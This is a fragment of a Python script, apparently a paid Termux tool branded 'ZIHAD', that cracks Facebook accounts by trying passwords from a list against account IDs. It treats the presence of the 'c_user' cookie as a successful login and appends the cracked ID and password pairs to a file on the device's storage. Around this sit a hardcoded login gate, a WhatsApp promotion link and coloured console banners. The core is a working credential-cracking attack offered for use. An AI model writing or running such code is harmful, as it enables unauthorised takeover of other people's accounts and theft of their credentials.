...
os.system('')
os.system('clear')
print('\x1b[1;32m             WELCOME TO ZIHAD NEW PAID TOOLS  \033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●')
time.sleep(1)
os.system('xdg-open https://wa.me/+8801302426149')
import getpass
...
while attemps < 12345677901:
    ...
    if username == 'ZIHAD' and password == 'BRO':
...
\033[1;32m[-] GITHUB    :\033[1;32m MR-HAKER2-CYBER-143
...
#os.system('espeak -a 300 " WELLCOME   TO THE   ZIHAD COMMAND"')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print ('')
                print('\033[1;93m [\033[1;96mZIHAD-OK🌻\033[1;93m]\033[1;91m = \033[1;96m\033[1;92m' +cid+' | '+ps+'\033[1;91m = \033[1;96m '+tahunng(cid))
              ...
              #  print('\033[1;96m[CYBER.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
               # print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
                open('/sdcard/ZIHAD-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        ...
        sys.stdout.write('\r%s[ZIHAD-KING💥]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),sys.stdout.flush()
